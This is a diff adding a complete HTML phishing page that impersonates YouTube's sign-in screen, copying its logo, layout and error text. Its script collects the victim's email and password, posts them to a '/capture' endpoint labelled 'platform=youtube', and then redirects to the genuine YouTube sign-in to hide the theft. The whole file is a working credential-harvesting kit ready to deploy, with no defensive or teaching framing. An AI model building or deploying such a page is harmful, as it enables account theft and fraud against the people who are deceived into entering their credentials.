@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube - Sign in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+        }
+        
+        .login-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 48px 40px 36px;
+        }
+        
+        .youtube-logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .youtube-logo svg {
+            height: 24px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 16px;
+            color: #202124;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 32px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: all 0.2s;
+        }
+        
+        .input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        .input-group label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: white;
+            padding: 0 4px;
+            color: #5f6368;
+            font-size: 16px;
+            transition: all 0.2s;
+            pointer-events: none;
+        }
+        
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 0;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        
+        .next-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        .next-button:hover {
+            background: #1557b0;
+        }
+        
+        .links {
+            margin-top: 32px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+        }
+        
+        .links a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .google-account {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #dadce0;
+            font-size: 14px;
+            color: #5f6368;
+            text-align: center;
+        }
+        
+        .google-account a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .spinner {
+            display: none;
+            margin: 20px auto;
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .error-message {
+            background: #fce8e6;
+            border-left: 4px solid #d93025;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #d93025;
+            display: none;
+        }
+        
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 32px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="youtube-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 90 20" width="90" height="20">
+                    <g fill="#FF0000">
+                        <path d="M27.9727 3.12324C27.6435 1.89323 26.6768 0.926623 25.4468 0.597366C23.2197 2.24288e-07 14.285 0 14.285 0C14.285 0 5.35042 2.24288e-07 3.12323 0.597366C1.89323 0.926623 0.926623 1.89323 0.597366 3.12324C2.24288e-07 5.35042 0 10 0 10C0 10 2.24288e-07 14.6496 0.597366 16.8768C0.926623 18.1068 1.89323 19.0734 3.12323 19.4026C5.35042 20 14.285 20 14.285 20C14.285 20 23.2197 20 25.4468 19.4026C26.6768 19.0734 27.6435 18.1068 27.9727 16.8768C28.5701 14.6496 28.5701 10 28.5701 10C28.5701 10 28.5677 5.35042 27.9727 3.12324Z"/>
+                    </g>
+                    <g fill="#FFFFFF">
+                        <path d="M11.4253 14.2854L18.8477 10.0004L11.4253 5.71533V14.2854Z"/>
+                    </g>
+                    <g fill="#282828">
+                        <path d="M68.602 4.64286V15.3571H70.3973V11.1112H72.1444C74.0465 11.1112 75.2819 9.79445 75.2819 7.87707C75.2819 5.95969 74.0465 4.64286 72.1444 4.64286H68.602ZM70.3973 9.61386V6.14011H71.9583C73.0354 6.14011 73.6266 6.69081 73.6266 7.87707C73.6266 9.06334 73.0354 9.61386 71.9583 9.61386H70.3973Z"/>
+                        <path d="M76.763 4.64286V15.3571H78.4766V12.5554L79.9903 10.7143L81.504 12.5554V15.3571H83.2176V4.64286H81.504V9.24242L79.9903 7.40134L78.4766 9.24242V4.64286H76.763Z"/>
+                        <path d="M86.222 4.64286V15.3571H87.9176V10.9196L90.5 15.3571H92.3955L89.6936 10.7143L92.3955 6.14011H90.5L87.9176 10.4545V4.64286H86.222Z"/>
+                        <path d="M46.5183 4.64286V15.3571H48.2955V4.64286H46.5183Z"/>
+                        <path d="M38.3949 4.64286V15.3571H44.5118V13.7826H40.1703V10.7954H44.0819V9.22098H40.1703V6.21742H44.5118V4.64286H38.3949Z"/>
+                        <path d="M30.7469 4.64286V15.3571H33.2701L35.5784 8.63281L37.8867 15.3571H40.4099V4.64286H38.6863V12.367L36.5319 5.93044H34.6248L32.4704 12.367V4.64286H30.7469Z"/>
+                    </g>
+                </svg>
+            </div>
+            
+            <h1>Sign in</h1>
+            <div class="subtitle">to continue to YouTube</div>
+            
+            <div class="error-message" id="errorMsg">
+                Couldn't sign you in. The email or password you entered is incorrect.
+            </div>
+            
+            <form id="loginForm" method="POST" action="/capture">
+                <div class="input-group">
+                    <input type="email" id="email" name="email" placeholder=" " required>
+                    <label for="email">Email or phone</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder=" " required>
+                    <label for="password">Password</label>
+                </div>
+                
+                <button type="submit" class="next-button" id="nextBtn">Next</button>
+                <div class="spinner" id="spinner"></div>
+            </form>
+            
+            <div class="links">
+                <a href="#">Forgot email?</a>
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <div class="google-account">
+                Not your computer? <a href="#">Use Guest mode</a> to sign in privately.
+                <br><br>
+                <a href="#">Create account</a>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            
+            if (!email) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Enter an email address or phone number';
+                return;
+            }
+            
+            if (!password) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Enter a password';
+                return;
+            }
+            
+            // Hide error if shown
+            errorMsg.style.display = 'none';
+            
+            // Show loading spinner
+            document.getElementById('nextBtn').style.display = 'none';
+            document.getElementById('spinner').style.display = 'block';
+            
+            // Send credentials to capture endpoint
+            fetch('/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'email=' + encodeURIComponent(email) + 
+                      '&password=' + encodeURIComponent(password) + 
+                      '&platform=youtube'
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Redirect to real YouTube
+                window.location.href = 'https://www.youtube.com/signin?next=%2F&action_handle_signin=true';
+            })
+            .catch(error => {
+                // Redirect anyway
+                window.location.href = 'https://www.youtube.com/signin?next=%2F&action_handle_signin=true';
+            });
+        });
+        
+        // Floating label animation
+        const inputs = document.querySelectorAll('.input-group input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.classList.add('focused');
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.parentElement.classList.remove('focused');
+                }
+            });
+        });
+        
+        // Auto-detect if email field has value
+        if (document.getElementById('email').value) {
+            document.getElementById('email').parentElement.classList.add('focused');
+        }
+    </script>
+</body>
+</html>
